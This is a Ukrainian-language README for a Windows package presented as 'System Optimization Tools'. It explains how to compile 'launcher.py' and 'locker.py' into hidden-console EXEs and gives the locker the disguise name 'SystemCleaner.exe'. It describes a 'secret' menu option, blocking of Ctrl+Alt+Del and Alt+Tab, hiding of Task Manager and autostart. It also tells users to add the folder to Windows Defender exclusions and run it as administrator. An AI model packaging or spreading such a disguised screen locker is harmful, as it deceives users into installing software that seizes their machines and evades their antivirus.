# System Optimization Tools - Windows Edition

## 🚀 ГОТОВА ЗБІРКА ДЛЯ WINDOWS + ІНСТРУКЦІЇ EXE

### 📁 Файли в збірці:
- `Optimize by kenjee.bat` - **ГОЛОВНИЙ ЗАПУСК** (3KB)
- `launcher.py` - Лаунчер меню (Python файл)
- `locker.py` - Основна програма (Python файл)
- `install.bat` - Встановлення залежностей Python
- `requirements.txt` - Список Python бібліотек

---

## 🎯 ДВА СПОСОБИ ВИКОРИСТАННЯ:

### 1️⃣ **СПОСІБ 1: EXE ФАЙЛИ (Рекомендований)**

#### 📋 Як створити EXE на Windows:

1. **Встановіть Python**:
   - Завантажте з https://python.org
   - ⚠️ **ОБОВ'ЯЗКОВО** поставте галочку "Add Python to PATH"

2. **Запустіть install.bat**:
   ```bat
   # Правий клік → "Запустити як адміністратор"
   install.bat
   ```

3. **Встановіть PyInstaller**:
   ```cmd
   pip install pyinstaller
   ```

4. **Створіть EXE файли**:
   ```cmd
   # Створити OptimizationTools.exe (лаунчер)
   pyinstaller --onefile --noconsole --name="OptimizationTools" launcher.py
   
   # Створити SystemCleaner.exe (основна програма)
   pyinstaller --onefile --noconsole --name="SystemCleaner" locker.py
   ```

5. **Скопіюйте EXE файли**:
   - Знайдіть файли в папці `dist/`
   - Скопіюйте `OptimizationTools.exe` та `SystemCleaner.exe` в основну папку

6. **Запустіть**:
   ```bat
   "Optimize by kenjee.bat"
   ```

---

### 2️⃣ **СПОСІБ 2: PYTHON ФАЙЛИ (Простіший)**

#### 📋 Швидке встановлення:

1. **Встановіть Python** (див. вище)
2. **Запустіть install.bat**
3. **Запустіть головний файл**:
   ```bat
   "Optimize by kenjee.bat"
   ```

---

## 🔧 НАЛАШТУВАННЯ PYINSTALLER (Детально):

### 📝 Команди для створення EXE:

```cmd
# Базова команда для лаунчера
pyinstaller --onefile --noconsole --name="OptimizationTools" --distpath=. launcher.py

# Базова команда для локера  
pyinstaller --onefile --noconsole --name="SystemCleaner" --distpath=. locker.py

# З додатковими опціями
pyinstaller --onefile --noconsole --name="OptimizationTools" --distpath=. --clean --workpath=build launcher.py
pyinstaller --onefile --noconsole --name="SystemCleaner" --distpath=. --clean --workpath=build locker.py
```

### 📂 Структура після створення EXE:
```
📁 Папка проекту/
├── Optimize by kenjee.bat     # 🚀 ГОЛОВНИЙ ЗАПУСК
├── OptimizationTools.exe      # 🛠️ Лаунчер (створений PyInstaller)
├── SystemCleaner.exe          # 🔒 Основна програма (створений PyInstaller)
├── launcher.py                # 📄 Оригінальний Python код
├── locker.py                  # 📄 Оригінальний Python код
├── install.bat                # 🔧 Встановлення Python
└── requirements.txt           # 📦 Залежності
```

---

## ⚙️ ФУНКЦІОНАЛЬНІСТЬ:

### 🎯 Як працює:
1. **Запуск** `Optimize by kenjee.bat`
2. **Пріоритет**: EXE файли → Python файли → Fallback меню
3. **Таємна функція**: Пункт 1 в меню (🤫)
4. **Інші пункти**: Звичайні утиліти очищення Windows

### 🛡️ Windows функції:
- ✅ Блокування клавіш (Ctrl+Alt+Del, Alt+Tab, Windows+R)
- ✅ Приховування Task Manager
- ✅ Автозапуск в системі
- ✅ Повноекранний режим
- ✅ Всі Windows API функції

---

## 🚨 ВАЖЛИВО:

### ⚠️ Антивірус:
- **Windows Defender** може блокувати EXE файли
- **Додайте в виключення** папку з програмою
- **Fallback**: Використовуйте Python файли

### 🎛️ Права адміністратора:
- **Потрібні** для повного функціоналу
- **Запускайте** .bat файл "як адміністратор"

### 💾 Системні вимоги:
- **Windows 10/11 64-bit**
- **Python 3.7+** (для Python режиму)
- **4GB RAM** мінімум

---

## 🎉 ГОТОВО!

Тепер у вас є:
- ✅ **Python файли** готові для EXE компіляції
- ✅ **Інструкції** створення Windows EXE
- ✅ **Fallback система** на випадок проблем
- ✅ **Повний функціонал** Windows

### 📞 Підтримка:
- **Проблеми з Python**: Запустіть `install.bat`
- **Проблеми з EXE**: Використовуйте Python файли
- **Антивірус блокує**: Додайте в виключення
